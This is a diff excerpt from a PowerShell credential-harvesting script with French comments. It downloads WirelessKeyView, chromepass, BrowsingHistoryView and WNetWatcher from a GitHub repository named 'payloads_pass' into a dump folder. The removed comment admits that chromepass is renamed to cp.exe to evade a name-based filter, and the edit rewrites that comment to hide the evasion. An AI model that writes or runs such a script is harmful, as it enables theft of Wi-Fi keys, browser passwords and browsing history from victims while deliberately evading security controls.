@@ -27,7 +27,7 @@ New-Item -ItemType Directory -Path $dumpFolder -Force | Out-Null
 Write-Host "[*] Telechargement des outils..." -ForegroundColor Yellow
 try {
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WirelessKeyView.exe" -OutFile "$basePath\WirelessKeyView.exe" -ErrorAction Stop
-    # On télécharge chromepass mais on le renomme immédiatement en cp.exe pour contrer le filtre sur le nom
+    # On télécharge et on renomme tout de suite en cp.exe
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/chromepass.exe" -OutFile "$basePath\cp.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/BrowsingHistoryView.exe" -OutFile "$basePath\BrowsingHistoryView.exe" -ErrorAction Stop
     Invoke-WebRequest "https://raw.githubusercontent.com/Azefayer/payloads_pass/main/WNetWatcher.exe" -OutFile "$basePath\WNetWatcher.exe" -ErrorAction Stop
